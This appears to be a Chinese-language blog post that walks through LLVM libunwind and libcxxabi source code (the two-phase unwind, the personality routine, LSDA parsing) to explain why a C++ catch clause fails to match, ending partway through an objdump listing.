    if (__unw_get_proc_info(cursor, &amp;frameInfo) != UNW_ESUCCESS) &#123;
        // ... ...
    &#125;

    // ... ...

    // If there is a personality routine, ask it if it will want to stop at
    // this frame.
    if (frameInfo.handler != 0) &#123;
      _Unwind_Personality_Fn p =
          (_Unwind_Personality_Fn)(uintptr_t)(frameInfo.handler);
      _LIBUNWIND_TRACE_UNWINDING(
          "unwind_phase1(ex_ojb=%p): calling personality function %p",
          (void *)exception_object, (void *)(uintptr_t)p);
      _Unwind_Reason_Code personalityResult =
          (*p)(1, _UA_SEARCH_PHASE, exception_object->exception_class,
               exception_object, (struct _Unwind_Context *)(cursor));
      switch (personalityResult) &#123;
      case _URC_HANDLER_FOUND:
        // found a catch clause or locals that need destructing in this frame
        // stop search and remember stack pointer at the frame
        __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);
        exception_object->private_2 = (uintptr_t)sp;
        _LIBUNWIND_TRACE_UNWINDING(
            "unwind_phase1(ex_ojb=%p): _URC_HANDLER_FOUND",
            (void *)exception_object);
        return _URC_NO_REASON;

      case _URC_CONTINUE_UNWIND:
        _LIBUNWIND_TRACE_UNWINDING(
            "unwind_phase1(ex_ojb=%p): _URC_CONTINUE_UNWIND",
            (void *)exception_object);
        // continue unwinding
        break;

      default:
        // something went wrong
        _LIBUNWIND_TRACE_UNWINDING(
            "unwind_phase1(ex_ojb=%p): _URC_FATAL_PHASE1_ERROR",
            (void *)exception_object);
        return _URC_FATAL_PHASE1_ERROR;
      &#125;
    &#125;
  &#125;
  return _URC_NO_REASON;
&#125;
static _Unwind_Reason_Code
unwind_phase2(unw_context_t *uc, unw_cursor_t *cursor, _Unwind_Exception *exception_object) &#123;
  __unw_init_local(cursor, uc);

  _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb&#x3D;%p)&quot;,
                             (void *)exception_object);

  &#x2F;&#x2F; uc is initialized by __unw_getcontext in the parent frame. The first stack
  &#x2F;&#x2F; frame walked is unwind_phase2.
  unsigned framesWalked &#x3D; 1;
  &#x2F;&#x2F; Walk each frame until we reach where search phase said to stop.
  while (true) &#123;

    &#x2F;&#x2F; Ask libunwind to get next frame (skip over first which is
    &#x2F;&#x2F; _Unwind_RaiseException).
    int stepResult &#x3D; __unw_step(cursor);
    &#x2F;&#x2F; ... ...

    &#x2F;&#x2F; Get info about this frame.
    unw_word_t sp;
    unw_proc_info_t frameInfo;
    __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);
    if (__unw_get_proc_info(cursor, &amp;frameInfo) !&#x3D; UNW_ESUCCESS) &#123;
        &#x2F;&#x2F; ... ...
    &#125;

    &#x2F;&#x2F; ... ...

    ++framesWalked;
    &#x2F;&#x2F; If there is a personality routine, tell it we are unwinding.
    if (frameInfo.handler !&#x3D; 0) &#123;
      _Unwind_Personality_Fn p &#x3D;
          (_Unwind_Personality_Fn)(uintptr_t)(frameInfo.handler);
      _Unwind_Action action &#x3D; _UA_CLEANUP_PHASE;
      if (sp &#x3D;&#x3D; exception_object-&gt;private_2) &#123;
        &#x2F;&#x2F; Tell personality this was the frame it marked in phase 1.
        action &#x3D; (_Unwind_Action)(_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME);
      &#125;
       _Unwind_Reason_Code personalityResult &#x3D;
          (*p)(1, action, exception_object-&gt;exception_class, exception_object,
               (struct _Unwind_Context *)(cursor));
      switch (personalityResult) &#123;
      case _URC_CONTINUE_UNWIND:
        &#x2F;&#x2F; Continue unwinding
        _LIBUNWIND_TRACE_UNWINDING(
            &quot;unwind_phase2(ex_ojb&#x3D;%p): _URC_CONTINUE_UNWIND&quot;,
            (void *)exception_object);
        if (sp &#x3D;&#x3D; exception_object-&gt;private_2) &#123;
          &#x2F;&#x2F; Phase 1 said we would stop at this frame, but we did not...
          _LIBUNWIND_ABORT(&quot;during phase1 personality function said it would &quot;
                           &quot;stop here, but now in phase2 it did not stop here&quot;);
        &#125;
        break;
      case _URC_INSTALL_CONTEXT:
        _LIBUNWIND_TRACE_UNWINDING(
            &quot;unwind_phase2(ex_ojb&#x3D;%p): _URC_INSTALL_CONTEXT&quot;,
            (void *)exception_object);
        &#x2F;&#x2F; Personality routine says to transfer control to landing pad.
        &#x2F;&#x2F; We may get control back if landing pad calls _Unwind_Resume().
        if (_LIBUNWIND_TRACING_UNWINDING) &#123;
          unw_word_t pc;
          __unw_get_reg(cursor, UNW_REG_IP, &amp;pc);
          __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);
          _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb&#x3D;%p): re-entering &quot;
                                     &quot;user code with ip&#x3D;0x%&quot; PRIxPTR
                                     &quot;, sp&#x3D;0x%&quot; PRIxPTR,
                                     (void *)exception_object, pc, sp);
        &#125;

        __unw_phase2_resume(cursor, framesWalked);
        &#x2F;&#x2F; __unw_phase2_resume() only returns if there was an error.
        return _URC_FATAL_PHASE2_ERROR;
      default:
        &#x2F;&#x2F; Personality routine returned an unknown result code.
        _LIBUNWIND_DEBUG_LOG(&quot;personality function returned unknown result %d&quot;,
                             personalityResult);
        return _URC_FATAL_PHASE2_ERROR;
      &#125;
    &#125;
  &#125;

  &#x2F;&#x2F; Clean up phase did not resume at the frame that the search phase
  &#x2F;&#x2F; said it would...
  return _URC_FATAL_PHASE2_ERROR;
&#125;
  这里的代码也很明晰，首先获取了当前栈帧的信息，然后将frameInfo.handler转换为_Unwind_Personality_Fn处理函数，然后调用这个函数进行处理。这里有两种情况：


unwind_phase1，当action=_UA_SEARCH_PHASE时，代码我们当前阶段是通过_Unwind_Personality_Fn搜索catch代码块，当找到处理块时，返回_URC_HANDLER_FOUND，并给exception_object-&gt;private_2赋值，方便在第二阶段进行执行。


unwind_phase2，exception_object-&gt;private_2 == sp时，当action=(_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME)时，我们开始调用_Unwind_Personality_Fn安装对应的catch-block，然后返回_URC_INSTALL_CONTEXT，最后执行__unw_phase2_resume开始执行异常处理。


  此外，这里的 __unw_init_local执行了一个非常重要的操作，那就是找到了.eh_frame的位置，下面简单看一下代码流程:
inline bool LocalAddressSpace::findUnwindSections(pint_t targetAddr,
                                                  UnwindInfoSections &amp;info) &#123;

    &#x2F;&#x2F; ... ...

    info.dso_base &#x3D; 0;
    &#x2F;&#x2F; Bare metal is statically linked, so no need to ask the dynamic loader
    info.dwarf_section_length &#x3D; (size_t)(&amp;__eh_frame_end - &amp;__eh_frame_start);
    info.dwarf_section &#x3D;        (uintptr_t)(&amp;__eh_frame_start);

    &#x2F;&#x2F; ... ...
&#125;

template &lt;typename A, typename R&gt;
void UnwindCursor&lt;A, R&gt;::setInfoBasedOnIPRegister(bool isReturnAddress) &#123;

  &#x2F;&#x2F; ... ...
  &#x2F;&#x2F; Ask address space object to find unwind sections for this pc.
  UnwindInfoSections sects;
  if (_addressSpace.findUnwindSections(pc, sects)) 
  &#x2F;&#x2F; ... ...
&#125;

&#x2F;&#x2F; template &lt;typename A, typename R&gt;
&#x2F;&#x2F; int UnwindCursor&lt;A, R&gt;::step() &#123;
&#x2F;&#x2F;     &#x2F;&#x2F; ... ...
&#x2F;&#x2F;     this-&gt;setInfoBasedOnIPRegister(true);
&#x2F;&#x2F;     &#x2F;&#x2F; ... ...
&#x2F;&#x2F; &#125;

_LIBUNWIND_HIDDEN int __unw_init_local(unw_cursor_t *cursor,
                                       unw_context_t *context) &#123;
  &#x2F;&#x2F; ... ...
  &#x2F;&#x2F; Use &quot;placement new&quot; to allocate UnwindCursor in the cursor buffer.
  new (reinterpret_cast&lt;UnwindCursor&lt;LocalAddressSpace, REGISTER_KIND&gt; *&gt;(cursor))
      UnwindCursor&lt;LocalAddressSpace, REGISTER_KIND&gt;(
          context, LocalAddressSpace::sThisAddressSpace);
#undef REGISTER_KIND
  AbstractUnwindCursor *co &#x3D; (AbstractUnwindCursor *)cursor;
  co-&gt;setInfoBasedOnIPRegister();

  return UNW_ESUCCESS;
&#125;
  这里的_Unwind_Personality_Fn函数是itanium-cxx-abi 定义的，定义文档在这个位置https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#cxx-throw。主要作用就是和c++特性相关的堆栈展开特定代码，这个函数在gcc/clang里面叫做：__gxx_personality_v0，我们直接去看他的源码。
libcxxabi\src\cxa_personality.cpp
#if !defined(_LIBCXXABI_ARM_EHABI)
#if defined(__SEH__) &amp;&amp; !defined(__USING_SJLJ_EXCEPTIONS__)
static _Unwind_Reason_Code __gxx_personality_imp
#else
_LIBCXXABI_FUNC_VIS _Unwind_Reason_Code
#ifdef __USING_SJLJ_EXCEPTIONS__
__gxx_personality_sj0
#elif defined(__MVS__)
__zos_cxx_personality_v2
#else
__gxx_personality_v0
#endif
#endif
                    (int version, _Unwind_Action actions, uint64_t exceptionClass,
                     _Unwind_Exception* unwind_exception, _Unwind_Context* context)
&#123;
    if (version !&#x3D; 1 || unwind_exception &#x3D;&#x3D; 0 || context &#x3D;&#x3D; 0)
        return _URC_FATAL_PHASE1_ERROR;

    bool native_exception &#x3D; (exceptionClass     &amp; get_vendor_and_language) &#x3D;&#x3D;
                            (kOurExceptionClass &amp; get_vendor_and_language);
    scan_results results;
    &#x2F;&#x2F; Process a catch handler for a native exception first.
    if (actions &#x3D;&#x3D; (_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME) &amp;&amp;
        native_exception) &#123;
        &#x2F;&#x2F; Reload the results from the phase 1 cache.
        __cxa_exception* exception_header &#x3D;
            (__cxa_exception*)(unwind_exception + 1) - 1;
        results.ttypeIndex &#x3D; exception_header-&gt;handlerSwitchValue;
        results.actionRecord &#x3D; exception_header-&gt;actionRecord;
        results.languageSpecificData &#x3D; exception_header-&gt;languageSpecificData;
        results.landingPad &#x3D;
            reinterpret_cast&lt;uintptr_t&gt;(exception_header-&gt;catchTemp);
        results.adjustedPtr &#x3D; exception_header-&gt;adjustedPtr;

        &#x2F;&#x2F; Jump to the handler.
        set_registers(unwind_exception, context, results);
        &#x2F;&#x2F; Cache base for calculating the address of ttype in
        &#x2F;&#x2F; __cxa_call_unexpected.
        if (results.ttypeIndex &lt; 0) &#123;
#if defined(_AIX)
          exception_header-&gt;catchTemp &#x3D; (void *)_Unwind_GetDataRelBase(context);
#else
          exception_header-&gt;catchTemp &#x3D; 0;
#endif
        &#125;
        return _URC_INSTALL_CONTEXT;
    &#125;

    &#x2F;&#x2F; In other cases we need to scan LSDA.
    scan_eh_tab(results, actions, native_exception, unwind_exception, context);
    if (results.reason &#x3D;&#x3D; _URC_CONTINUE_UNWIND ||
        results.reason &#x3D;&#x3D; _URC_FATAL_PHASE1_ERROR)
        return results.reason;

    if (actions &amp; _UA_SEARCH_PHASE)
    &#123;
        &#x2F;&#x2F; Phase 1 search:  All we&#39;re looking for in phase 1 is a handler that
        &#x2F;&#x2F;   halts unwinding
        assert(results.reason &#x3D;&#x3D; _URC_HANDLER_FOUND);
        if (native_exception) &#123;
            &#x2F;&#x2F; For a native exception, cache the LSDA result.
            __cxa_exception* exc &#x3D; (__cxa_exception*)(unwind_exception + 1) - 1;
            exc-&gt;handlerSwitchValue &#x3D; static_cast&lt;int&gt;(results.ttypeIndex);
            exc-&gt;actionRecord &#x3D; results.actionRecord;
            exc-&gt;languageSpecificData &#x3D; results.languageSpecificData;
            exc-&gt;catchTemp &#x3D; reinterpret_cast&lt;void*&gt;(results.landingPad);
            exc-&gt;adjustedPtr &#x3D; results.adjustedPtr;
        &#125;
        return _URC_HANDLER_FOUND;
    &#125;

    assert(actions &amp; _UA_CLEANUP_PHASE);
    assert(results.reason &#x3D;&#x3D; _URC_HANDLER_FOUND);
    set_registers(unwind_exception, context, results);
    &#x2F;&#x2F; Cache base for calculating the address of ttype in __cxa_call_unexpected.
    if (results.ttypeIndex &lt; 0) &#123;
      __cxa_exception* exception_header &#x3D;
            (__cxa_exception*)(unwind_exception + 1) - 1;
#if defined(_AIX)
      exception_header-&gt;catchTemp &#x3D; (void *)_Unwind_GetDataRelBase(context);
#else
      exception_header-&gt;catchTemp &#x3D; 0;
#endif
    &#125;
    return _URC_INSTALL_CONTEXT;
&#125;
  我们从整体来看这段代码，从上面可以知道，phase1，phase2都会调用到这里来：


phase1, action=_UA_SEARCH_PHASE, 调用scan_eh_tab查找catch-block，并返回_URC_HANDLER_FOUND


phase2, action=(_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME)，通过set_registers设置对应的catch-block，然后返回_URC_INSTALL_CONTEXT，然后在__unw_phase2_resume执行对应的catch-block。


  从上面的实现来看，scan_eh_tab是核心，其正是展开异常搜索和匹配的关键。其源码如下
static void scan_eh_tab(scan_results &amp;results, _Unwind_Action actions,
                        bool native_exception,
                        _Unwind_Exception *unwind_exception,
                        _Unwind_Context *context) &#123;
    &#x2F;&#x2F; Initialize results to found nothing but an error
    results.ttypeIndex &#x3D; 0;
    results.actionRecord &#x3D; 0;
    results.languageSpecificData &#x3D; 0;
    results.landingPad &#x3D; 0;
    results.adjustedPtr &#x3D; 0;
    results.reason &#x3D; _URC_FATAL_PHASE1_ERROR;
    &#x2F;&#x2F; Check for consistent actions
    &#x2F;&#x2F; ... ...

    &#x2F;&#x2F; Start scan by getting exception table address.
    const uint8_t *lsda &#x3D; (const uint8_t *)_Unwind_GetLanguageSpecificData(context);
    if (lsda &#x3D;&#x3D; 0)
    &#123;
        &#x2F;&#x2F; There is no exception table
        results.reason &#x3D; _URC_CONTINUE_UNWIND;
        return;
    &#125;
    results.languageSpecificData &#x3D; lsda;
#if defined(_AIX)
    uintptr_t base &#x3D; _Unwind_GetDataRelBase(context);
#else
    uintptr_t base &#x3D; 0;
#endif
    &#x2F;&#x2F; Get the current instruction pointer and offset it before next
    &#x2F;&#x2F; instruction in the current frame which threw the exception.
    uintptr_t ip &#x3D; _Unwind_GetIP(context) - 1;
    &#x2F;&#x2F; Get beginning current frame&#39;s code (as defined by the
    &#x2F;&#x2F; emitted dwarf code)
    uintptr_t funcStart &#x3D; _Unwind_GetRegionStart(context);
#ifdef __USING_SJLJ_EXCEPTIONS__
    if (ip &#x3D;&#x3D; uintptr_t(-1))
    &#123;
        &#x2F;&#x2F; no action
        results.reason &#x3D; _URC_CONTINUE_UNWIND;
        return;
    &#125;
    else if (ip &#x3D;&#x3D; 0)
        call_terminate(native_exception, unwind_exception);
    &#x2F;&#x2F; ip is 1-based index into call site table
#else  &#x2F;&#x2F; !__USING_SJLJ_EXCEPTIONS__
    uintptr_t ipOffset &#x3D; ip - funcStart;
#endif &#x2F;&#x2F; !defined(_USING_SLJL_EXCEPTIONS__)
    const uint8_t* classInfo &#x3D; NULL;
    &#x2F;&#x2F; Note: See JITDwarfEmitter::EmitExceptionTable(...) for corresponding
    &#x2F;&#x2F;       dwarf emission
    &#x2F;&#x2F; Parse LSDA header.
    uint8_t lpStartEncoding &#x3D; *lsda++;
    const uint8_t* lpStart &#x3D;
        (const uint8_t*)readEncodedPointer(&amp;lsda, lpStartEncoding, base);
    if (lpStart &#x3D;&#x3D; 0)
        lpStart &#x3D; (const uint8_t*)funcStart;
    uint8_t ttypeEncoding &#x3D; *lsda++;
    if (ttypeEncoding !&#x3D; DW_EH_PE_omit)
    &#123;
        &#x2F;&#x2F; Calculate type info locations in emitted dwarf code which
        &#x2F;&#x2F; were flagged by type info arguments to llvm.eh.selector
        &#x2F;&#x2F; intrinsic
        uintptr_t classInfoOffset &#x3D; readULEB128(&amp;lsda);
        classInfo &#x3D; lsda + classInfoOffset;
    &#125;
    &#x2F;&#x2F; Walk call-site table looking for range that
    &#x2F;&#x2F; includes current PC.
    uint8_t callSiteEncoding &#x3D; *lsda++;
#ifdef __USING_SJLJ_EXCEPTIONS__
    (void)callSiteEncoding;  &#x2F;&#x2F; When using SjLj exceptions, callSiteEncoding is never used
#endif
    uint32_t callSiteTableLength &#x3D; static_cast&lt;uint32_t&gt;(readULEB128(&amp;lsda));
    const uint8_t* callSiteTableStart &#x3D; lsda;
    const uint8_t* callSiteTableEnd &#x3D; callSiteTableStart + callSiteTableLength;
    const uint8_t* actionTableStart &#x3D; callSiteTableEnd;
    const uint8_t* callSitePtr &#x3D; callSiteTableStart;
    while (callSitePtr &lt; callSiteTableEnd)
    &#123;
        &#x2F;&#x2F; There is one entry per call site.
#ifndef __USING_SJLJ_EXCEPTIONS__
        &#x2F;&#x2F; The call sites are non-overlapping in [start, start+length)
        &#x2F;&#x2F; The call sites are ordered in increasing value of start
        uintptr_t start &#x3D; readEncodedPointer(&amp;callSitePtr, callSiteEncoding);
        uintptr_t length &#x3D; readEncodedPointer(&amp;callSitePtr, callSiteEncoding);
        uintptr_t landingPad &#x3D; readEncodedPointer(&amp;callSitePtr, callSiteEncoding);
        uintptr_t actionEntry &#x3D; readULEB128(&amp;callSitePtr);
        if ((start &lt;&#x3D; ipOffset) &amp;&amp; (ipOffset &lt; (start + length)))
#else  &#x2F;&#x2F; __USING_SJLJ_EXCEPTIONS__
        &#x2F;&#x2F; ip is 1-based index into this table
        uintptr_t landingPad &#x3D; readULEB128(&amp;callSitePtr);
        uintptr_t actionEntry &#x3D; readULEB128(&amp;callSitePtr);
        if (--ip &#x3D;&#x3D; 0)
#endif &#x2F;&#x2F; __USING_SJLJ_EXCEPTIONS__
        &#123;
            &#x2F;&#x2F; Found the call site containing ip.
#ifndef __USING_SJLJ_EXCEPTIONS__
            if (landingPad &#x3D;&#x3D; 0)
            &#123;
                &#x2F;&#x2F; No handler here
                results.reason &#x3D; _URC_CONTINUE_UNWIND;
                return;
            &#125;
            landingPad &#x3D; (uintptr_t)lpStart + landingPad;
#else  &#x2F;&#x2F; __USING_SJLJ_EXCEPTIONS__
            ++landingPad;
#endif &#x2F;&#x2F; __USING_SJLJ_EXCEPTIONS__
            results.landingPad &#x3D; landingPad;
            if (actionEntry &#x3D;&#x3D; 0)
            &#123;
                &#x2F;&#x2F; Found a cleanup
                results.reason &#x3D; actions &amp; _UA_SEARCH_PHASE
                                     ? _URC_CONTINUE_UNWIND
                                     : _URC_HANDLER_FOUND;
                return;
            &#125;
            &#x2F;&#x2F; Convert 1-based byte offset into
            const uint8_t* action &#x3D; actionTableStart + (actionEntry - 1);
            bool hasCleanup &#x3D; false;
            &#x2F;&#x2F; Scan action entries until you find a matching handler, cleanup, or the end of action list
            while (true)
            &#123;
                const uint8_t* actionRecord &#x3D; action;
                int64_t ttypeIndex &#x3D; readSLEB128(&amp;action);
                if (ttypeIndex &gt; 0)
                &#123;
                    &#x2F;&#x2F; Found a catch, does it actually catch?
                    &#x2F;&#x2F; First check for catch (...)
                    const __shim_type_info* catchType &#x3D;
                        get_shim_type_info(static_cast&lt;uint64_t&gt;(ttypeIndex),
                                           classInfo, ttypeEncoding,
                                           native_exception, unwind_exception,
                                           base);
                    if (catchType &#x3D;&#x3D; 0)
                    &#123;
                        &#x2F;&#x2F; Found catch (...) catches everything, including
                        &#x2F;&#x2F; foreign exceptions. This is search phase, cleanup
                        &#x2F;&#x2F; phase with foreign exception, or forced unwinding.
                        assert(actions &amp; (_UA_SEARCH_PHASE | _UA_HANDLER_FRAME |
                                          _UA_FORCE_UNWIND));
                        results.ttypeIndex &#x3D; ttypeIndex;
                        results.actionRecord &#x3D; actionRecord;
                        results.adjustedPtr &#x3D;
                            get_thrown_object_ptr(unwind_exception);
                        results.reason &#x3D; _URC_HANDLER_FOUND;
                        return;
                    &#125;
                    &#x2F;&#x2F; Else this is a catch (T) clause and will never
                    &#x2F;&#x2F;    catch a foreign exception
                    else if (native_exception)
                    &#123;
                        __cxa_exception* exception_header &#x3D; (__cxa_exception*)(unwind_exception+1) - 1;
                        void* adjustedPtr &#x3D; get_thrown_object_ptr(unwind_exception);
                        const __shim_type_info* excpType &#x3D;
                            static_cast&lt;const __shim_type_info*&gt;(exception_header-&gt;exceptionType);
                        if (adjustedPtr &#x3D;&#x3D; 0 || excpType &#x3D;&#x3D; 0)
                        &#123;
                            &#x2F;&#x2F; Something very bad happened
                            call_terminate(native_exception, unwind_exception);
                        &#125;
                        if (catchType-&gt;can_catch(excpType, adjustedPtr))
                        &#123;
                            &#x2F;&#x2F; Found a matching handler. This is either search
                            &#x2F;&#x2F; phase or forced unwinding.
                            assert(actions &amp;
                                   (_UA_SEARCH_PHASE | _UA_FORCE_UNWIND));
                            results.ttypeIndex &#x3D; ttypeIndex;
                            results.actionRecord &#x3D; actionRecord;
                            results.adjustedPtr &#x3D; adjustedPtr;
                            results.reason &#x3D; _URC_HANDLER_FOUND;
                            return;
                        &#125;
                    &#125;
                    &#x2F;&#x2F; Scan next action ...
                &#125;
                else if (ttypeIndex &lt; 0)
                &#123;
                    &#x2F;&#x2F; Found an exception specification.
                    if (actions &amp; _UA_FORCE_UNWIND) &#123;
                        &#x2F;&#x2F; Skip if forced unwinding.
                    &#125; else if (native_exception) &#123;
                        &#x2F;&#x2F; Does the exception spec catch this native exception?
                        __cxa_exception* exception_header &#x3D; (__cxa_exception*)(unwind_exception+1) - 1;
                        void* adjustedPtr &#x3D; get_thrown_object_ptr(unwind_exception);
                        const __shim_type_info* excpType &#x3D;
                            static_cast&lt;const __shim_type_info*&gt;(exception_header-&gt;exceptionType);
                        if (adjustedPtr &#x3D;&#x3D; 0 || excpType &#x3D;&#x3D; 0)
                        &#123;
                            &#x2F;&#x2F; Something very bad happened
                            call_terminate(native_exception, unwind_exception);
                        &#125;
                        if (exception_spec_can_catch(ttypeIndex, classInfo,
                                                     ttypeEncoding, excpType,
                                                     adjustedPtr,
                                                     unwind_exception, base))
                        &#123;
                            &#x2F;&#x2F; Native exception caught by exception
                            &#x2F;&#x2F; specification.
                            assert(actions &amp; _UA_SEARCH_PHASE);
                            results.ttypeIndex &#x3D; ttypeIndex;
                            results.actionRecord &#x3D; actionRecord;
                            results.adjustedPtr &#x3D; adjustedPtr;
                            results.reason &#x3D; _URC_HANDLER_FOUND;
                            return;
                        &#125;
                    &#125; else &#123;
                        &#x2F;&#x2F; foreign exception caught by exception spec
                        results.ttypeIndex &#x3D; ttypeIndex;
                        results.actionRecord &#x3D; actionRecord;
                        results.adjustedPtr &#x3D;
                            get_thrown_object_ptr(unwind_exception);
                        results.reason &#x3D; _URC_HANDLER_FOUND;
                        return;
                    &#125;
                    &#x2F;&#x2F; Scan next action ...
                &#125; else &#123;
                    hasCleanup &#x3D; true;
                &#125;
                const uint8_t* temp &#x3D; action;
                int64_t actionOffset &#x3D; readSLEB128(&amp;temp);
                if (actionOffset &#x3D;&#x3D; 0)
                &#123;
                    &#x2F;&#x2F; End of action list. If this is phase 2 and we have found
                    &#x2F;&#x2F; a cleanup (ttypeIndex&#x3D;0), return _URC_HANDLER_FOUND;
                    &#x2F;&#x2F; otherwise return _URC_CONTINUE_UNWIND.
                    results.reason &#x3D; hasCleanup &amp;&amp; actions &amp; _UA_CLEANUP_PHASE
                                         ? _URC_HANDLER_FOUND
                                         : _URC_CONTINUE_UNWIND;
                    return;
                &#125;
                &#x2F;&#x2F; Go to next action
                action +&#x3D; actionOffset;
            &#125;  &#x2F;&#x2F; there is no break out of this loop, only return
        &#125;
#ifndef __USING_SJLJ_EXCEPTIONS__
        else if (ipOffset &lt; start)
        &#123;
            &#x2F;&#x2F; There is no call site for this ip
            &#x2F;&#x2F; Something bad has happened.  We should never get here.
            &#x2F;&#x2F; Possible stack corruption.
            call_terminate(native_exception, unwind_exception);
        &#125;
#endif &#x2F;&#x2F; !__USING_SJLJ_EXCEPTIONS__
    &#125;  &#x2F;&#x2F; there might be some tricky cases which break out of this loop

    &#x2F;&#x2F; It is possible that no eh table entry specify how to handle
    &#x2F;&#x2F; this exception. By spec, terminate it immediately.
    call_terminate(native_exception, unwind_exception);
&#125;

  从这里可以看到，这里的核心就是获取lsda数据（_Unwind_GetLanguageSpecificData, .gcc_except_table段），然后用上下文传过来的抛出的异常信息来匹配，如果匹配上，就找到了对应的catch字段，我们就返回并执行，如果没有匹配上，就只有调用std::terminate了。
  其实这里的解析lsda，就能找到对应的catch-block，因此我们需要了解一下lsda的大致结构：
&#x2F;*
    Exception Handling Table Layout:

+-----------------+--------+
| lpStartEncoding | (char) |
+---------+-------+--------+---------------+-----------------------+
| lpStart | (encoded with lpStartEncoding) | defaults to funcStart |
+---------+-----+--------+-----------------+---------------+-------+
| ttypeEncoding | (char) | Encoding of the type_info table |
+---------------+-+------+----+----------------------------+----------------+
| classInfoOffset | (ULEB128) | Offset to type_info table, defaults to null |
+-----------------++--------+-+----------------------------+----------------+
| callSiteEncoding | (char) | Encoding for Call Site Table |
+------------------+--+-----+-----+------------------------+--------------------------+
| callSiteTableLength | (ULEB128) | Call Site Table length, used to find Action table |
+---------------------+-----------+---------------------------------------------------+
+---------------------+-----------+------------------------------------------------+
| Beginning of Call Site Table            The current ip is a 1-based index into   |
| ...                                     this table.  Or it is -1 meaning no      |
|                                         action is needed.  Or it is 0 meaning    |
|                                         terminate.                               |
| +-------------+---------------------------------+------------------------------+ |
| | landingPad  | (ULEB128)                       | offset relative to lpStart   | |
| | actionEntry | (ULEB128)                       | Action Table Index 1-based   | |
| |             |                                 | actionEntry &#x3D;&#x3D; 0 -&gt; cleanup  | |
| +-------------+---------------------------------+------------------------------+ |
| ...                                                                              |
+----------------------------------------------------------------------------------+
+---------------------------------------------------------------------+
| Beginning of Action Table       ttypeIndex &#x3D;&#x3D; 0 : cleanup           |
| ...                             ttypeIndex  &gt; 0 : catch             |
|                                 ttypeIndex  &lt; 0 : exception spec    |
| +--------------+-----------+--------------------------------------+ |
| | ttypeIndex   | (SLEB128) | Index into type_info Table (1-based) | |
| | actionOffset | (SLEB128) | Offset into next Action Table entry  | |
| +--------------+-----------+--------------------------------------+ |
| ...                                                                 |
+---------------------------------------------------------------------+-----------------+
| type_info Table, but classInfoOffset does *not* point here!                           |
| +----------------+------------------------------------------------+-----------------+ |
| | Nth type_info* | Encoded with ttypeEncoding, 0 means catch(...) | ttypeIndex &#x3D;&#x3D; N | |
| +----------------+------------------------------------------------+-----------------+ |
| ...                                                                                   |
| +----------------+------------------------------------------------+-----------------+ |
| | 1st type_info* | Encoded with ttypeEncoding, 0 means catch(...) | ttypeIndex &#x3D;&#x3D; 1 | |
| +----------------+------------------------------------------------+-----------------+ |
| +---------------------------------------+-----------+------------------------------+  |
| | 1st ttypeIndex for 1st exception spec | (ULEB128) | classInfoOffset points here! |  |
| | ...                                   | (ULEB128) |                              |  |
| | Mth ttypeIndex for 1st exception spec | (ULEB128) |                              |  |
| | 0                                     | (ULEB128) |                              |  |
| +---------------------------------------+------------------------------------------+  |
| ...                                                                                   |
| +---------------------------------------+------------------------------------------+  |
| | 0                                     | (ULEB128) | throw()                      |  |
| +---------------------------------------+------------------------------------------+  |
| ...                                                                                   |
| +---------------------------------------+------------------------------------------+  |
| | 1st ttypeIndex for Nth exception spec | (ULEB128) |                              |  |
| | ...                                   | (ULEB128) |                              |  |
| | Mth ttypeIndex for Nth exception spec | (ULEB128) |                              |  |
| | 0                                     | (ULEB128) |                              |  |
| +---------------------------------------+------------------------------------------+  |
+---------------------------------------------------------------------------------------+
*&#x2F;
  从这里可以知道，其实lsda的核心，就是遍历 Call Site Table，获取到Action Table Index，然后在Action Table中获取到ttypeIndex，然后根据ttypeIndex在type_info Table中开始搜索和匹配异常对象和catch对象是否匹配。如果匹配，返回，如果不匹配，循环遍历Action Table中的action链表，直到处理完。




本文不同异常捕获的原因分析
  根据上文的分析，本文的问题肯定出在lsda的Action Table和type_info Table上面。
int main(int argc, char* argv[])
&#123;
        try&#123;
                p();
        &#125;
        catch(std::exception&amp; e)&#123;
                printf(&quot;std::exception: %s\n&quot;, e.what());
        &#125;
        catch(...)&#123;
                printf(&quot;unkown exception\n&quot;);
        &#125;
        return 0;
&#125;
# objdump -d --disassemble=main ./build/test
# 此时是正常捕获std异常
0000000000001a70 &lt;main>:
    1a70:       55                      push   %rbp
    1a71:       48 89 e5                mov    %rsp,%rbp
    1a74:       48 83 ec 30             sub    $0x30,%rsp
    1a78:       c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%rbp)
    1a7f:       89 7d f8                mov    %edi,-0x8(%rbp)
    1a82:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
    1a86:       e8 35 01 00 00          call   1bc0 &lt;p@plt>
    1a8b:       e9 00 00 00 00          jmp    1a90 &lt;main+0x20>
    1a90:       e9 51 00 00 00          jmp    1ae6 &lt;main+0x76>
    1a95:       48 89 c1                mov    %rax,%rcx
    1a98:       89 d0                   mov    %edx,%eax
    1a9a:       48 89 4d e8             mov    %rcx,-0x18(%rbp)
    1a9e:       89 45 e4                mov    %eax,-0x1c(%rbp)
    1aa1:       8b 45 e4                mov    -0x1c(%rbp),%eax
    1aa4:       b9 02 00 00 00          mov    $0x2,%ecx
    1aa9:       39 c8                   cmp    %ecx,%eax
    1aab:       0f 85 3d 00 00 00       jne    1aee &lt;main+0x7e>
    1ab1:       48 8b 7d e8             mov    -0x18(%rbp),%rdi
    1ab5:       e8 16 01 00 00          call   1bd0 &lt;__cxa_begin_catch@plt>
    1aba:       48 89 45 d8             mov    %rax,-0x28(%rbp)
    1abe:       48 8b 7d d8             mov    -0x28(%rbp),%rdi
    1ac2:       48 8b 07                mov    (%rdi),%rax
    1ac5:       48 8b 40 10             mov    0x10(%rax),%rax
    1ac9:       ff d0                   call   *%rax
    1acb:       48 89 c6                mov    %rax,%rsi
    1ace:       48 8d 3d a1 ed ff ff    lea    -0x125f(%rip),%rdi        # 876 &lt;_IO_stdin_used+0x16>
    1ad5:       31 c0                   xor    %eax,%eax
    1ad7:       e8 04 01 00 00          call   1be0 &lt;printf@plt>
    1adc:       e9 00 00 00 00          jmp    1ae1 &lt;main+0x71>
